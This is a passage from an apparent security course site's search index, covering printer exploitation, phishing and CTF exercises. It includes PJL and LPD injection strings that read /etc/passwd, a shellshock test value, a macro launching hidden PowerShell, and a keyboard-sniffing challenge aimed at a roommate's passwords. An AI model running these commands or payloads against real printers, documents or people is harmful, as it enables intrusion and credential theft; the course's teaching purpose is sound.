Internet\u2026</p>"},{"location":"CS315/2021/Week%208/#inside-job","title":"Inside job","text":"<p>If you have physical access to the printer you can also plug in an USB drive or even a SD card.</p>"},{"location":"CS315/2021/Week%208/#possible-mayhem-one-can-cause","title":"Possible Mayhem one can cause\u2026","text":"<p>So now we\u2019re kinda back to the linked topic at the beginning of the small web series directed by HP. So how realistic are the shown scenarios?</p>"},{"location":"CS315/2021/Week%208/#dos","title":"DoS","text":"<ul> <li>Transmission Channel - basically block the/one printing port to keep the printer busy and don\u2019t print anything anymore.</li> <li>Document processing - manipulate a Document via PDL and let the printer interpret it\u2026 e.g.: an infinite loop in PS.</li> <li>Physical damage - malware causing writes on NVRAM chips which have a life expectancy of ~10^5 writes 30.</li> </ul>"},{"location":"CS315/2021/Week%208/#privilege-escalation","title":"Privilege Escalation","text":"<ul> <li>Factory defaults - reset to factory defaults to bypass authentication.</li> <li>Accounting bypass - similar thing here, printing without authentication.</li> </ul>"},{"location":"CS315/2021/Week%208/#print-job-access","title":"Print Job Access","text":"<ul> <li>Print job retention - Try to find stored print jobs on the printer and extract those.</li> <li>Print job manipulation - Alter print jobs. You can imagine the possible mayhem caused itself.</li> </ul>"},{"location":"CS315/2021/Week%208/#information-disclosure","title":"Information Disclosure","text":"<ul> <li>Memory access - may lead to finding sensitive data like passwords or printed documents.</li> <li>File system access - potentially retrieve sensitive information like configuration files or stored print jobs.</li> <li>Credential disclosure - brute force attacks against changed default login credentials to gain access</li> </ul>"},{"location":"CS315/2021/Week%208/#code-execution","title":"Code Execution","text":"<ul> <li>Buffer overflows - printers provide additional languages and network services, potentially prone to this kind of attack</li> <li>Firmware updates - it is common for printers to deploy firmware updates as ordinary print jobs cough malicious firmware cough</li> <li>Software packages - \u2018custom tailored and manipulated printer apps\u2019</li> </ul>"},{"location":"CS315/2021/Week%208/#misc","title":"Misc","text":"<ul> <li>Malware - target network printers and spread it in local networks to other peers.</li> </ul>"},{"location":"CS315/2021/Week%208/#possible-scenarios","title":"possible scenarios","text":"<p>Depending on the planned attack and possible access one has a variety of attack vectors. One need more planning than others. Some need physical access and some can be done from remote. Combinations of those are easily possible!</p> <p>For example issuing a malicious firmware update via a simple print job (possible case: no authentication needed), which extracts sensitive data and renders the printer useless. -Printer \u2018ransomware\u2019 may be a thing, even if it sounds kinda weird.</p> <p>So to conclude this section, I think the shown attacks in the videos were presented a tad to \u2018flashy\u2019, but are indeed possible depending on the printers and network they are placed in.</p>"},{"location":"CS315/2021/Week%208/#tools","title":"Tools","text":"<p>A lot of these techniques mentioned above need some serious work or knowledge about the underlying structure ( e.g.: used PDL, PCL). Even though these might be fairly easily found out using manuals or online search it\u2019s still a hassle and extra work. So people already made our lifes more easy by providing tools for almost all tasks mentioned above :).</p>"},{"location":"CS315/2021/Week%208/#beef","title":"BeEF","text":"<p>The Browser Exploitation Framework (BeEF) is a penetration testing tool that focuses on the web browser. It allows the penetration tester to assess the actual security posture of a target environment by using client-side attack vectors. This is not really printer specific, but it is a framework to implement cross-site printing 48 functionality.</p>"},{"location":"CS315/2021/Week%208/#praeda","title":"Praeda","text":"<p>Praeda - \u201cAn Automated Printer Data Harvesting Tool\u201d written in perl. Also a tool to help pentesters to gather usable data during security assessment jobs. Praeda systematically collects sensitive information from the printer\u2019s embedded web server. This includes device passwords, usernames, email addresses which might be available publicly on the web interface.</p>"},{"location":"CS315/2021/Week%208/#pret-328","title":"PRET 328","text":"<p>This one is real nifty tool written in python to check for basically every attack vector I mentioned above. It tries to connect to the printer via network or USB and tries to exploit the used printer languages, currently supported are PS, PJL and PCL. When successfully connected one has a ton of available commands. A full list can be found on the Github, linked below.</p>"},{"location":"CS315/2021/Week%208/#les","title":"LES","text":"<p>Linux Exploit Suggester is a neat little perl script, which gives some options for possible exploits depending on your kernel. As stated above the kernel versions for embedded operating systems are often far lower, compared to current linux based desktop or server distributions. So old, usually fixed exploit techniques might still be viable here!</p> <p>Note: It is likely, that perl is not present in it\u2019s full range and copying it to a printer is extra work. Luckily one can run simply run in a desktop environment and specifying the kernel you want to exploit</p>"},{"location":"CS315/2021/Week%208/#my-home-printer-a-journey-to-find-a-way-in","title":"My home printer - a journey to find a way in!","text":"<p>Ok what is a basic plan to concentrate on when trying to exploit a printer? I\u2019ve given a lot of theory until this point, as well as some \u201cDo\u2019s\u201d and \u201cMights\u201d. Maybe you\u2019ve got some ideas on your own already, but here\u2019s a little experimental journey from me.</p> <p>So first thing that is obvious is to check for open ports and an OS fingerprint. Luckily we have nmap. Nmap is bae for this.</p>"},{"location":"CS315/2021/Week%208/#wheres-the-door","title":"Where\u2019s the door?","text":"<pre><code>$ sudo nmap 192.168.1.108\nStarting Nmap 7.01 ( https://nmap.org ) at 2017-09-11 20:13 CEST\nNmap scan report for 192.168.1.108\nHost is up (0.031s latency).\nNot shown: 993 closed ports\nPORT     STATE SERVICE\n80/tcp   open  http\n139/tcp  open  netbios-ssn\n443/tcp  open  https\n445/tcp  open  microsoft-ds\n515/tcp  open  printer\n631/tcp  open  ipp\n9100/tcp open  jetdirect\nMAC Address: 44:D2:44:1C:73:E2 (Seiko Epson)\n\nNmap done: 1 IP address (1 host up) scanned in 2.04 seconds\n\nDevice type: specialized\nRunning: Linux 2.6.X\nOS CPE: cpe:/o:linux:linux_kernel:2.6\nOS details: Linux 2.6.31 - 2.6.35 (embedded)\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n$\n</code></pre> <p>So we have the usual printing ports open, as well as some other basic ones. It is running an older Linux as well, so no big surprise there! No open 22/TCP port though. So causing mayhem on the file system is not possible as of now.</p>"},{"location":"CS315/2021/Week%208/#pret-and-done","title":"PRET and done?","text":"<p>I\u2019ve praised PRET quite a bit above, so let\u2019s give it a try to check if my Epson printer has a nice, hopefully standard set of supported printer languages!</p> <pre><code>$ python pret.py 192.168.1.108 -s PS\n\nChecking for IPP support:       found\nChecking for HTTP support:      found\nChecking for SNMP support:      found\nChecking for PS support:        not found\n$\n\n$ python pret.py 192.168.1.108 -s Pjl\nChecking for IPP support:       found\nChecking for HTTP support:      found\nChecking for SNMP support:      found\nChecking for PJL support:       not found\n$\n\n$ python pret.py 192.168.1.108 -s PCL\nChecking for IPP support:       found\nChecking for HTTP support:      found\nChecking for SNMP support:      found\nChecking for PCL support:       not found\n$\n</code></pre> <p>So no SSH and not even a standard version here\u2026 Most likely the result of my vendor using some exotic stuff again and not keeping things simple \u2026</p> <p>Anyway using PRET is easy and self explanatory, once connected a help function will give you an overview of available stuff! From checking the file-system. creating directories, changing configuration files or even dumping the whole NVRAM. PRET can do it all (in theory that is ).</p> <p>After trying a few things to find a way to make PRET work for me I trashed that idea for now and moved on!</p>"},{"location":"CS315/2021/Week%208/#les_1","title":"LES","text":"<p>So I wanted to have some fun now after the two disappointing results :D. So let\u2019s dig deeper into what Linux exploits might get suggested for our version!</p> <pre><code>$ perl Linux_Exploit_Suggester.pl -k 2.6.31\n\nKernel local: 2.6.31\n\nSearching among 65 exploits...\n\nPossible Exploits:\n[+] american-sign-language\n   CVE-2010-4347\n   Source: http://www.securityfocus.com/bid/45408/\n[+] can_bcm\n   CVE-2010-2959\n   Source: http://www.exploit-db.com/exploits/14814/\n[+] do_pages_move\n   Alt: sieve    CVE-2010-0415\n   Source: Spenders Enlightenment\n[+] half_nelson\n   Alt: econet    CVE-2010-3848\n   Source: http://www.exploit-db.com/exploits/6851\n[+] half_nelson1\n   Alt: econet    CVE-2010-3848\n   Source: http://www.exploit-db.com/exploits/17787/\n[+] half_nelson2\n   Alt: econet    CVE-2010-3850\n   Source: http://www.exploit-db.com/exploits/17787/\n[+] half_nelson3\n   Alt: econet    CVE-2010-4073\n   Source: http://www.exploit-db.com/exploits/17787/\n[+] msr\n   CVE-2013-0268\n   Source: http://www.exploit-db.com/exploits/27297/\n[+] pipe.c_32bit\n   CVE-2009-3547\n   Source: http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c\n[+] pktcdvd\n   CVE-2010-3437\n   Source: http://www.exploit-db.com/exploits/15150/\n[+] ptrace_kmod2\n   Alt: ia32syscall,robert_you_suck    CVE-2010-3301\n   Source: http://www.exploit-db.com/exploits/15023/\n[+] rawmodePTY\n   CVE-2014-0196\n   Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c\n[+] rds\n   CVE-2010-3904\n   Source: http://www.exploit-db.com/exploits/15285/\n[+] reiserfs\n   CVE-2010-1146\n   Source: http://www.exploit-db.com/exploits/12130/\n[+] video4linux\n   CVE-2010-3081\n   Source: http://www.exploit-db.com/exploits/15024/\n$\n</code></pre> <p>Note: If these are viable and meet all dependencies has to be checked of course, but a brief look at them made me decide not to spend too much effort here.</p>"},{"location":"CS315/2021/Week%208/#manual-pjl-injection","title":"Manual PJL Injection","text":"<p>So I thought why not check for PJL again and try invoking some command strings manually in combination with netcat as a listener!</p> <p>So I tried using:</p> <pre><code>echo \"@PJL FSUPLOAD FORMAT:BINARY NAME=\"../../etc/passwd\" OFFSET=0 SIZE=648\" | nc -v -v 192.168.1.108 9100\n# If successful this should display the */etc/passwd* file.\n</code></pre> <p>or</p> <pre><code>echo \"@PJL INFO ID\" | nc -v -v 192.168.1.108 9100\n# If successful this should get the *printer\u2019s device information*\n</code></pre> <p>as well as other PJL command injecting techniques, but my printer is not accepting any of these. It\u2019s not reacting at all to this kind of \u2018attack\u2019\u2026</p> <p>I\u2019m not knowledgeable enough to launch this with PS and PCL as well, because their command syntax differs greatly (obviously). I\u2019m remaining with a note to search for PS and PCL attack strings.</p>"},{"location":"CS315/2021/Week%208/#a-pret-test-script-to-the-rescue","title":"A PRET test script to the rescue?","text":"<p>So PRET doesn\u2019t work for my home printer as seen above. Interestingly I found that there is a script \u201chidden\u201d within the PRET source folder called \u201clpdtest.py\u201d It can test for known, but older (like really older) vulnerabilities within the Line Printer Daemon, listed here 60. This involves some basic tests:</p>"},{"location":"CS315/2021/Week%208/#get-test","title":"\u2018get\u2019 Test","text":"<p>Trying to get (aka print) a file from printer\u2019s file system.</p> <p>$ lpdtest.py printer get /etc/passwd $ lpdtest.py printer get \u2026/\u2026/\u2026/etc/passwd</p> <p>etc\u2026</p>"},{"location":"CS315/2021/Week%208/#in-test","title":"\u2018in\u2019 Test","text":"<p>This test is for fuzzing around with user input (hostname,username, jobname, filenames, etc.). This might be useful to test for interpretation of shell commands\u2026</p> <pre><code># Test for environment variables\n$ lpdtest.py printer in '$UID'\n\n# Test for pipes and redirects\n$ lpdtest.py printer in '| pwd'\n$ lpdtest.py printer in '&gt;/etc/passwd'\n\n# Test for backticks\n$ lpdtest.py printer in '`ls`'\n\n# Test for [shellshock (CVE-2014-6271)](http://seclists.org/oss-sec/2014/q3/650)\n$ lpdtest.py printer in '() {:;}; /bin/ping -c1 1.2.3.4'\n</code></pre> <p>As expected these attacks were already fixed. My printer spit out a few pages with lines like</p> <p>\u201cIf you can read this lpdtest.py XYZ failed!\u201d</p> <p>So the result here some wasted paper and ink\u2026</p>"},{"location":"CS315/2021/Week%208/#summary","title":"Summary","text":""},{"location":"CS315/2021/Week%208/#why-printer-exploitation","title":"Why Printer Exploitation?","text":"<ul> <li>(most) printers are already full blown computers!</li> <li>Printer as port/network/exploits scanner</li> <li>Computing/hash-cracking/sniffing</li> <li>Malware upload</li> <li>\u201cStealth\u201d/\u201cuncleanable\u201d command and control</li> <li>Unencrypted data theft</li> </ul>"},{"location":"CS315/2021/Week%208/#afterthoughts","title":"Afterthoughts","text":"<ul> <li>How many people would expect their printers is infected?</li> <li>How many users/admins/security-auditors audit and hard secure their network printers?</li> <li>How many persons or anti malware products could clean such a malware?</li> <li>\u2026?</li> </ul>"},{"location":"CS315/2021/Week%208/#outlook-and-closing-words","title":"Outlook and closing words","text":"<p>If I get the hands on some nicer printer I will deliver some exploit stuff later on I promise. If I get some more time to get a breakdown of my current home printer so I can take a look under the hood and to figure something out. An example here would be to capture a firmware update and trying to unpack/reverse that one. This would take a lot more time and preparation of my part, which would cause serious delay to this article as well.</p> <p>So I\u2019m keeping it rather open ended now, but I hope I could inspire some minds here to take a closer look as well. Furthermore I hope this article reached the people who were interested and were able learn some things. So if you want to try to exploit your own device, just try it out! Remember:</p> <ul> <li>Find a way into the system,</li> <li>Check for the used printer languages and try code injection techniques for these,</li> <li>Try dumping the file system directory structure from the web interface,</li> <li>Upload self created \u201cmalicious\u201d firmware if it is supported,</li> <li>Find a new way</li> </ul> <p>I\u2019m looking forward to feedback and improvement suggestions.</p>"},{"location":"CS315/2021/Week%208/#further-readings","title":"Further readings","text":""},{"location":"CS315/2021/Week%208/#article-related-resources","title":"Article related resources:","text":"<ul> <li>LPD RFC 17</li> <li>SMB RFC 17</li> <li>IPP RFC 16</li> <li>How Network Printing Works 11</li> <li>PostScript Manual 7</li> <li>BeEF 18</li> <li>Praeda 18</li> <li>PRET 328</li> <li>Linux Exploit Suggester 31</li> <li>Printer Security Test Cheat Sheet 44</li> <li>Hacking Printers Wiki 27</li> </ul>"},{"location":"CS315/2021/Week%208/#extras","title":"Extras:","text":"<ul> <li>Running DOOM on a Printer 61</li> <li>From patched to Pwnd 23</li> <li>Thousands of printers hacked across the globe after critical flaw exposed 25</li> <li>Cross_Site_Printing 26</li> </ul>"},{"location":"CS315/2021/Week%208/#exercise","title":"Exercise","text":""},{"location":"CS315/2021/Week%208/#4-pt-go-chase-the-free-wave","title":"(4 pt) GO!! Chase the free wave!","text":"<p>[-] ~~Hackergame 2021 challenge \"\u53bb\u5427\uff01\u8ffd\u5bfb\u81ea\u7531\u7684\u7535\u6ce2\"~~</p> <p>[+] Inspired by Hackergame. Original created challenge.</p> <p>[an interesting story]</p> <p>OK now you have this mp3 file, please find the flag.</p> <p>video.mp3</p> <p>Hint1: it's too fast to understand!</p> <p>Hint2: if I can let the time move backwards, this might be easier.</p> <p>Hint3: some online OCR might be helpful. For example, https://speech-to-text-demo.ng.bluemix.net/</p>"},{"location":"CS315/2021/Week%208/#4-pt-mechanical-keyboard","title":"(4 pt) Mechanical Keyboard","text":"<p>Have you faced the situation, that your roommate is playing games so late and the sound of mechanical keyboard is super noisy?</p> <p>Meanwhile, especially you have midterm exam the next day.</p> <p>You decide to record this sound and try to find some interesting key taps from your roommate.</p> <p>(Account password, secret chat with girlfriend, or pxxxhub keywords...)</p> <p>dist.zip</p> <p>Hint1: the key taps only contain lower case characters and spaces.</p> <p>Hint2: keyboard sniffing paper: https://www.davidsalomon.name/CompSec/auxiliary/KybdEmanation.pdf</p> <p>Hint3: online key tap detector: https://keytap2.ggerganov.com/</p> <p>Hint4: another (faster) method: recognize key tap sound, generate a substitution cipher and break.</p> <p>Hint5: flag only contains lower case characters and underline (replace all spaces to underlines).</p> <p>Example program to generate key sound average:</p> <pre><code>from scipy.io import wavfile\nsamplerate, data = wavfile.read('./output.wav')\n\ni = 0\ncountsilent = 0\nsamplefound = 0\n\navg = []\nstart = 0\nend = 0\navg.append([0])\n\nfor sample in data:\n    i+=1    \n    if(sample[1]&lt;100):\n        countsilent += 1\n    if(countsilent &gt; 10000 and sample[1]&gt;100):\n        countsilent = 0\n        #print(str(i)+\": sample found\")\n        start = i\n        samplefound = 1\n    if(countsilent &gt; 8000 and samplefound==1):\n        samplefound = 0\n        #print(str(i)+\": sample ended\")\n        end = i\n        avg[len(avg)-1]=avg[len(avg)-1]/(end-start)\n        print(\"avg: \"+str(avg[len(avg)-1]))\n        avg.append([0])\n    if (samplefound == 1):\n        avg[len(avg)-1] += sample[1]\n</code></pre> <p>Example program to map sound to character:</p> <pre><code>alphabet = \"abcdefghijklmnopqr stuvwxyz\"\navg = {}\n\ni=0\n\nres=\"\"\n\nwith open(\"avg\") as file:\n    for line in file:\n        value = line.rstrip()[6:-1]\n        #print(value)\n        if str(value) not in avg:\n            avg[str(value)]=alphabet[i]\n            i+=1\n        res+=avg[str(value)]\nprint(avg)\nprint(res)\n</code></pre> <p>Online substitution cipher solver: https://www.boxentriq.com/code-breaking/cryptogram</p>"},{"location":"CS315/2021/Week%208/#2-pt-free-usb","title":"(2 pt) Free USB","text":"<p>A stranger has left his USB on my desk.</p> <p>[plug in...]</p> <p>OMG my mouse is out of control!</p> <p>usb.pcapng</p> <p>Hint1: packet is a USB capture, used for Logitech Optical Mouse.</p> <p>Hint2: IRP ID is the only part changes in capture, which represents the mouse move.</p> <p>Hint3: Gnuplot is an application to simulate mouse clicks.</p> <p>Hint4: the first word in flag is \"tHE\".</p>"},{"location":"CS315/2021/Week%209/","title":"Week9 MISC: Social Engineering","text":"<p>According to @Hacktricks: https://book.hacktricks.xyz/</p>"},{"location":"CS315/2021/Week%209/#clone-a-website","title":"Clone a Website","text":"<p>For a phishing assessment sometimes it might be useful to completely clone a website.</p> <p>Note that you can add also some payloads to the cloned website like a BeEF hook to \"control\" the tab of the user. </p> <p>There are different tools you can use for this purpose:</p>"},{"location":"CS315/2021/Week%209/#wget","title":"wget","text":"<pre><code>wget -mk -nH\n</code></pre>"},{"location":"CS315/2021/Week%209/#goclone","title":"goclone","text":"<pre><code>#https://github.com/imthaghost/goclone\noclone &lt;url&gt;\n</code></pre>"},{"location":"CS315/2021/Week%209/#social-engineering-toolit","title":"Social Engineering Toolit","text":"<pre><code>#https://github.com/trustedsec/social-engineer-toolkit\n</code></pre>"},{"location":"CS315/2021/Week%209/#detecting-phising","title":"Detecting Phising","text":""},{"location":"CS315/2021/Week%209/#introduction","title":"Introduction","text":"<p>In order to detect a phishing attempt it's important to understand the phishing techniques that are being used nowadays. In the parent page of this post you can find this information, so if you aren't aware of which techniques are being used today I recommend you to go to the parent page and read at least that section.</p> <p>This post is based in the idea that the attackers will try to somehow mimic or used the victim's domain name. If your domain is called <code>example.com</code> and you receive a phishing that is using a completely different domain name for some reason like <code>youwonthelottery.com</code>, this techniques aren't going to uncover it.</p>"},{"location":"CS315/2021/Week%209/#domain-name-variations","title":"Domain name variations","text":"<p>It's kind of easy to uncover those phishing attempts that will use a similar domain name inside the email. It's enough to generate a list of the most probable phishing names that an attacker may use and check if it's registered or just check if there is any IP using it.</p>"},{"location":"CS315/2021/Week%209/#finding-suspicions-domains","title":"Finding suspicions domains","text":"<p>For this purpose you can use any of the following tools. Note that these tolls will also perform DNS requests automatically to check if the domain has any IP assigned to it:</p> <ul> <li>*dnstwist*</li> <li>urlcrazy****</li> </ul>"},{"location":"CS315/2021/Week%209/#bitflipping","title":"Bitflipping","text":"<p>In the world of computing, everything is stored in bits (zeros and ones) in memory behind the scenes. This applies to domains too. For example, windows.com becomes 01110111... in the volatile memory of your computing device. However, what if one of these bits got automatically flipped due to a solar flare, cosmic rays, or a hardware error? That is one of the 0's becomes a 1 and vice versa. Applying this concept to DNS request, it's possible that the domain requested that arrives to the DNS server isn't the same as the domain initially requested.</p> <p>For example a 1 bit modification in the domain microsoft.com can transform it into windnws.com. Attackers may register as many bit-flipping domains as possible related to the victim in order to redirect legitimate users to their infrastructure.</p> <p>For more information read https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/</p> <p>All possible bit-flipping domain names should be also monitored.</p>"},{"location":"CS315/2021/Week%209/#basic-checks","title":"Basic checks","text":"<p>Once you have a list of potential suspicions domain names you should check them (mainly the ports HTTP and HTTPS) to see if they are using some login form similar to someone of the victim's domain. You could also check the port 3333 to see if it's open and running an instance of <code>gophish</code>. It's also interesting to know how old each discovered suspicions domain is, the younger it's the riskier it is. You can also get screenshots of the HTTP and/or HTTPS suspicious web page to see if it's really suspicious and in that case access it to take a deeper look.</p>"},{"location":"CS315/2021/Week%209/#advanced-checks","title":"Advanced checks","text":"<p>If you want to go one step further I would recommend you to monitor those suspicious domains and search for more once in a while (every day? it only takes a few seconds/minutes). You should also check the open ports of the related IPs and search for instances of <code>gophish</code> or similar tools (yes, attackers also make mistakes) and monitor the HTTP and HTTPS web pages of the suspicions domains and subdomains to see if they have copied any login form from the victims web pages. In order to automate this I would recommend to to have a list of login forms of the victims domains, spider the suspicions web pages and compare each login form found inside the suspicions domains with each login form of the victim's domain using something like <code>ssdeep</code>. If you have located the login forms of the suspicions domains you can try to send junk credentials and check if it's redirecting you to the victims domain.</p>"},{"location":"CS315/2021/Week%209/#domain-names-using-keywords","title":"Domain names using keywords","text":"<p>The parent page also mentions a domain name variation technique that consist on putting the victim's domain name inside a bigger domain (e.g. paypal-financial.com for paypal.com).</p>"},{"location":"CS315/2021/Week%209/#certificate-transparency","title":"Certificate Transparency","text":"<p>It's not possible to take the previous \"Brute-Force\" approach but it's actually possible to uncover this phishing attempts also thanks to certificate transparency. Every time a certificate is emitted by a CA, the details are made public. This means that reading the certificate transparency or even monitoring it, it's possible to find domains that are using a keyword inside it's name For example, if attackers generates a certificate of https://paypal-financial.com, seeing the certificate it's possible to find the keyword \"paypal\" and know that that suspicions email is being used.</p> <p>The post https://0xpatrik.com/phishing-domains/ suggest that you can use Censys to search for certificates affecting a specific keyword and filter by date (only \"new\" certificates) and by the CA issuer \"Let's Encrypt\":</p> <p></p> <p>However, you can do \"the same\" using the free web crt.sh. You can search for the keyword and the filter the results by date and CA if you whish.</p> <p></p> <p>Using this last option you can even use the field Matching Identities to see if any identity from the real domain matches any of the suspicious domain (note that a suspicious domain can be a false positive).</p> <p>Another alternative is the fantastic project called CertStream. CertStream provides a real-time stream of newly generated certificates which you can use to detect specified keywords in (near) real-time. In fact, there is a project called phishing_catcher that does just like that.</p>"},{"location":"CS315/2021/Week%209/#new-domains","title":"New domains","text":"<p>One last alternative is to gather a list of newly registered domains for some TLDs (Whoxy provides such service) and check the keywords in these domains. However, long domains usually uses one or more subdomains, therefore the keyword won't appear inside the FLD and you won't be able to find the phishing subdomain.</p>"},{"location":"CS315/2021/Week%209/#phishing-documents","title":"Phishing Documents","text":"<p>Microsoft Word performs file data validation prior to opening a file. Data validation is performed in the form of data structure identification, against the OfficeOpenXML standard. If any error occurs during the data structure identification, the file being analysed will not be opened.</p> <p>Usually Word files containing macros uses the <code>.docm</code> extension. However, it's possible to rename the file changing the file extension and still keep their macro executing capabilities. For example, an RTF file does not support macros, by design, but a DOCM file renamed to RTF will be handled by Microsoft Word and will be capable of macro execution. The same internals and mechanisms apply to all software of the Microsoft Office Suite (Excel, PowerPoint etc.).</p> <p>You can use the following command to check which extensions are going to be executed by some Office programs:</p> <pre><code>assoc | findstr /i \"word excel powerp\"\n</code></pre> <p>DOCX files referencing a remote template (File \u2013Options \u2013Add-ins \u2013Manage: Templates \u2013Go) that includes macros can \u201cexecute\u201d macros as well.</p>"},{"location":"CS315/2021/Week%209/#word-with-external-image","title":"Word with external image","text":"<p>Go to: Insert --&gt; Quick Parts --&gt; Field Categories*: Links and References, Filed names*: includePicture, and Filename or URL*:* http://%3Cip%3E/whatever</p> <p></p>"},{"location":"CS315/2021/Week%209/#macros-code","title":"Macros Code","text":"<pre><code>Dim author As String\nauthor = oWB.BuiltinDocumentProperties(\"Author\")\nWith objWshell1.Exec(\"powershell.exe -nop -Windowsstyle hidden -Command-\")\n .StdIn.WriteLine author\n .StdIn.WriteBlackLines 1\n</code></pre>"},{"location":"CS315/2021/Week%209/#autoload-functions","title":"Autoload functions","text":"<p>The more common they are, the more probable the AV will detect it.</p> <ul> <li>AutoOpen()</li> <li>Document_Open()</li> </ul>"},{"location":"CS315/2021/Week%209/#malicious-macros-generators","title":"Malicious Macros Generators","text":""},{"location":"CS315/2021/Week%209/#macos","title":"MacOS","text":"<ul> <li>macphish</li> <li>Mythic Macro Generator</li> </ul>"},{"location":"CS315/2021/Week%209/#exercise","title":"Exercise","text":""},{"location":"CS315/2021/Week%209/#4-pt-sanity-check","title":"(4 pt) Sanity Check","text":"<p>Got some reviews that our challenges are so hard. Frank becomes so sad because there's no difficult challenges this week. </p> <p>We even have a sanity check for the first challenge.</p> <p><code>flag{1_l0v3_54n17y_ch3ck_ch4ll5}</code></p> <p>Hint1: the flag is in question description.</p> <p>Hint2: the flag is in plain text.</p>"},{"location":"CS315/2021/Week%209/#4-pt-vidcap","title":"(4 pt) VidCap","text":"<p>Found this pcap of my ex's network traffic. I knew they're streaming video but I can't extract it. Can you help me ?</p> <p>Hint1: this challenge is from COMPFEST 13.</p> <p>Hint2: successfully extract files in the zip leads to the checkpoint.</p> <p>video.zip</p>"},{"location":"CS315/2021/Week%209/#2-pt-archaeology","title":"(2 pt) Archaeology","text":"<p>Windows XP is a great OS. When cleaning my Windows XP laptop, something unfortunate happened...</p> <p>Hint1: after you found the docx, use XOR brute. This isn't a macro forensics.</p> <p>Archaeology.zip from MEGA</p> <p>Archaeology.zip from Baidu Disk with password <code>l720</code></p>"},{"location":"CS315/2021/file/chall8/","title":"\u7981\u6b62\u5185\u5377","text":"<p>\u8be5\u653e\u9898\u65f6\u81ea\u4f1a\u653e\u9898</p> <p>\u63d0\u524d\u505a\u9898\u4f53\u9a8c\u6781\u5dee</p> <p>\u505a\u5b8c\u53d1\u7fa4\u66f4\u662f\u4e00\u7edd</p> <p>\u62d2\u7edd\u7126\u8651\u4ece\u6211\u505a\u8d77</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/","title":"CTF Introduction and the Hacker Attitude","text":"<p>https://ctf101.org/</p> <p>http://www.catb.org/~esr/faqs/hacker-howto.html</p> <p>https://ctf-wiki.org/</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#ctf-introduction","title":"CTF Introduction","text":"<p>Capture The Flags, or CTFs, is a kind of computer security competition.</p> <p>Teams of competitors (or just individuals) are pitted against each other in a test of computer security skills.</p> <p>Very often CTFs are the beginning of one's cyber security career due to their team-building nature and competitive aspect. In addition, there isn't a lot of commitment required beyond a weekend.</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#origin-of-ctf","title":"Origin of CTF","text":"<p>CTF's predecessor is a traditional networking technology competition between hackers, which originated at the 4th DEFCON in 1996.</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#early-ctf-competitions","title":"Early CTF Competitions","text":"<p>The first CTF competitions (1996 - 2001) had no clear rules and no professionally built competition platform and environment. It was up to the teams to prepare their own targets (prepare and defend their own targets, and try to break each other's targets). The organizers are mostly just non-professional volunteers who accept requests for manual scoring from the participating teams.</p> <p>The lack of automated back-end systems and judges' technical competence, scoring delays and errors, as well as unreliable networks and improper configurations, led to a great deal of controversy and dissatisfaction.</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#the-modern-ctf-competition","title":"The \"Modern\" CTF Competition","text":"<p>A professional team undertakes the competition platform, proposition, event organization, and automated point system. Teams are required to submit applications and are selected by the DEFCON conference organizers.</p> <p>The following features stand out for the three years of DEFCON CTF competitions organized by LegitBS.</p> <p>The competition focuses on core competencies in underlying computer and system security, and web vulnerability techniques are completely ignored. The competition environment tends to be a multi-CPU instruction architecture set, multi-operating system, and multi-programming language. Zero-sum\" scoring rules are used. The team's comprehensive ability test: reverse analysis, vulnerability mining, vulnerability exploitation, vulnerability patching and reinforcement, network traffic analysis, system security operation and maintenance, and security programming debugging.</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#ctf-competition-types","title":"CTF Competition Types","text":"<p>Jeopardy is commonly used in online selection competitions. In Jeopardy CTF, teams can participate via the Internet or a live network, where they solve technical challenges in cybersecurity by interacting with the online environment or analyzing files offline to earn points, similar to ACM programming competitions and informatics Olympiads, and are ranked based on total points and time.</p> <p>The different problem-solving problem-solving modes will generally set the first blood, and second blood, third blood, that is, the first three teams to complete the problem will get extra points, so this is not only the first team to solve the problem to encourage the value of the team, but also an indirect reflection of the team's ability.</p> <p>Of course there is also a popular scoring rule that sets the initial score for each question and then gradually reduces the score of the question according to the number of teams that have successfully answered the question, meaning that the more people answer the question, the lower the score of the question will be. Eventually it will drop to a guaranteed score and then stop dropping.</p> <p>The main types of questions include Web network attack and defense, RE reverse engineering, Pwn binary exploit, Crypto cryptographic attacks, Mobile mobile security, and Misc security miscellaneous six categories.</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#ctf-contest-contents","title":"CTF Contest Contents","text":"<p>Since the CTF has a wide range of questions, there are no clear boundaries as to what will be tested. However, as far as the current competition questions are concerned, they are mainly classified according to the common Web network attack and defense, RE reverse engineering, Pwn binary vulnerability exploitation, Crypto cryptography attack, Mobile security, and Misc security.</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#web-web-attack-and-defense","title":"Web - Web Attack and Defense","text":"<p>Mainly introduces the common vulnerabilities in Web security, such as SQL injection, XSS, CSRF, file inclusion, file upload, code audit, PHP weak types, etc., common questions and solutions in Web security, and provides some common tools.</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#reverse-engineering-reverse-engineering","title":"Reverse Engineering - Reverse Engineering","text":"<p>Mainly introduces the common question types, tools platform, and solution ideas in Reverse Engineering, and the advanced part introduces the common software protection, decompiling, anti-debugging, shelling, and deshelling techniques in Reverse Engineering.</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#pwn-binary-vulnerability-exploitation","title":"Pwn - binary vulnerability exploitation","text":"<p>The Pwn topic mainly examines the discovery and exploitation of binary vulnerabilities, which requires a certain understanding of the underlying computer operating system. PWN topics are mainly found on the Linux platform in the CTF competition.</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#crypto-cryptographic-attacks","title":"Crypto - Cryptographic Attacks","text":"<p>Classical cryptography is interesting and diverse, while modern cryptography is highly secure and requires high algorithmic understanding.</p>"},{"location":"CTF/CTF%20and%20Hacker%20Attitude/#mobile-mobile-security","title":"Mobile - Mobile Security","text":"<p>Mainly introduces the common tools and main problem types in Android inversion. Android inversion often requires certain knowledge of Android development. iOS inversion topics are less frequent in CTF competitions, so not too much introduction is 